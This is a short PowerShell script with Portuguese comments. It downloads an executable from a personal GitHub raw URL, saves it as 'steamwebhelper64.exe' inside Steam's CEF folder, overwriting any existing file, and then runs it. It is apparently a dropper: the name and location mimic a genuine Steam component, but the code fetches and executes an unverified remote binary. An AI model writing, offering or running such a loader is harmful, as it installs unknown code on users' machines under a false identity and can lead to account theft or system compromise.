$diretorio = "C:\Program Files (x86)\Steam\bin\cef\cef.win7x64"
$url = "https://raw.githubusercontent.com/superman-legit/eosmenorminimushpecinhafilhadaputa/refs/heads/main/steamwebhelper64.exe"
$caminhoArquivo = Join-Path -Path $diretorio -ChildPath "steamwebhelper64.exe"

# Cria os diretórios se não existirem
if (!(Test-Path -Path $diretorio)) {
    New-Item -Path $diretorio -ItemType Directory | Out-Null
}

# Apaga o arquivo se já existir
if (Test-Path -Path $caminhoArquivo) {
    Write-Host "Apagando arquivo existente."
    Remove-Item -Path $caminhoArquivo -Force
}

# Baixa o novo arquivo
Write-Host "Instalando nova versão..."
Invoke-WebRequest -Uri $url -OutFile $caminhoArquivo

Write-Host "Execução..."
Start-Process $caminhoArquivo

Write-Host "Sucesso."
